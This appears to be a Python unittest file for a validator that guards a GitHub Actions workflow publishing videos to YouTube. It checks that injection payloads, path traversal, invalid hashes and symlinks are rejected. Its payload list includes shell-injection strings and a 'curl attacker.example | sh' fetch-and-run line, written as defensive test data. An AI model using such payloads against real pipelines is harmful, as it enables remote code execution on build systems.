"""B4f0 offline tests: no workflow_dispatch text becomes shell code."""
from datetime import datetime, timezone
from pathlib import Path
from tempfile import TemporaryDirectory
import unittest

from scripts.validate_publish_dispatch_b4f0 import (
    DispatchInputRejected, validate_dispatch, validate_source_run,
    validate_downloaded_media,
)

NOW=datetime(2026,11,7,3,0,tzinfo=timezone.utc)
GOOD={
    "FM_SOURCE_RUN_ID":"42325905744",
    "FM_ARTIFACT_NAME":"review-artifact-123_4",
    "FM_VIDEO_FILE":"episode_video.mp4",
    "FM_CAPTIONS_FILE":"episode_captions.srt",
    "FM_THUMBNAIL_FILE":"cover.png",
    "FM_EPISODE":"content/episodes/fm_20261108_short_am.json",
    "FM_RECEIPT":"state/published/fm_20261108_short_am.json",
    "FM_PUBLISH_AT_UTC":"2026-11-08T05:30:00Z",
    "FM_VIDEO_SHA256":"a"*64,
    "FM_APPROVAL_MANIFEST":"state/approvals/fm_20261108_short_am.json",
    "FM_PRIVACY":"private",
}
SOURCE={"headBranch":"main","headSha":"a"*40,"conclusion":"success",
        "event":"workflow_dispatch"}


class DispatchTests(unittest.TestCase):
    def test_valid_dispatch_is_not_approval(self):
        result=validate_dispatch(GOOD,now=NOW)
        self.assertFalse(result["youtube_insert_authorized_by_this_check"])
        self.assertFalse(result["real_owner_or_media_approved"])

    def test_shell_payloads_in_each_input_are_rejected(self):
        payloads=(
            '"; touch /tmp/flowminute_injected; echo "',
            '$(touch /tmp/flowminute_injected)',
            chr(96)+"touch /tmp/flowminute_injected"+chr(96),
            "'; curl attacker.example | sh; '",
            "\nfoo=bar",
            "../other.mp4",
            "/tmp/something.mp4",
            "foo\\evil.mp4",
        )
        for key in GOOD:
            for payload in payloads:
                with self.subTest(key=key,payload=payload),self.assertRaises(DispatchInputRejected):
                    validate_dispatch({**GOOD,key:payload},now=NOW)

    def test_invalid_clock_hash_source_id_or_privacy_fails(self):
        for key,value in (
            ("FM_SOURCE_RUN_ID","0"),("FM_SOURCE_RUN_ID","-5"),
            ("FM_VIDEO_SHA256","A"*64),
            ("FM_PUBLISH_AT_UTC","2026-11-07T03:02:00Z"),
            ("FM_PUBLISH_AT_UTC","2026-12-32T03:30:00Z"),
            ("FM_PRIVACY","public"),("FM_PRIVACY","unlisted"),
            ("FM_ARTIFACT_NAME","..bad"),
            ("FM_VIDEO_FILE","hidden.mp4/../../secret"),
        ):
            with self.subTest(key=key,value=value),self.assertRaises(DispatchInputRejected):
                validate_dispatch({**GOOD,key:value},now=NOW)

    def test_source_run_must_be_main_success_not_pr(self):
        result=validate_source_run(SOURCE)
        self.assertFalse(result["youtube_insert_authorized"])
        for key,value in (
            ("headBranch","feature/payload"),("conclusion","failure"),
            ("event","pull_request"),("headSha","f"*64),
            ("headSha","INVALID"),
        ):
            with self.subTest(key=key,value=value),self.assertRaises(DispatchInputRejected):
                validate_source_run({**SOURCE,key:value})

    def test_media_check_rejects_symlink(self):
        with TemporaryDirectory() as tmp:
            root=Path(tmp)
            for key in ("FM_VIDEO_FILE","FM_CAPTIONS_FILE","FM_THUMBNAIL_FILE"):
                (root/GOOD[key]).write_bytes(b"A"*300)
            env={**GOOD,"FM_PUBLISH_AT_UTC":"2099-11-08T05:30:00Z"}
            self.assertFalse(validate_downloaded_media(root,env)["youtube_insert_authorized"])
            (root/GOOD["FM_VIDEO_FILE"]).unlink()
            (root/GOOD["FM_VIDEO_FILE"]).symlink_to(root/GOOD["FM_CAPTIONS_FILE"])
            with self.assertRaises(DispatchInputRejected):
                validate_downloaded_media(root,env)

    def test_dispatch_inputs_never_interpolate_directly_in_shell(self):
        yaml=(Path(__file__).resolve().parents[1]/
              ".github/workflows/publish-artifact-youtube.yml").read_text()
        self.assertIn("FM_VIDEO_FILE: $"+"{{ inputs.video_file }}",yaml)
        self.assertIn('python -m scripts.validate_publish_dispatch_b4f0 dispatch',yaml)
        self.assertIn('python -m scripts.validate_publish_dispatch_b4f0 source',yaml)
        self.assertIn('python -m scripts.validate_publish_dispatch_b4f0 files',yaml)
        blocks=yaml.split("\n        run: |")
        self.assertGreaterEqual(len(blocks),4)
        for block in blocks[1:]:
            self.assertNotIn("$"+"{{ inputs.",block.split("\n      - ",1)[0])
        self.assertNotIn('"$'+'{{ inputs.source_run_id }}"',yaml)
        self.assertIn('environment: youtube-production',yaml)
        self.assertIn("vars.PUBLISH_ENABLED == 'true'",yaml)


if __name__=="__main__":
    unittest.main()
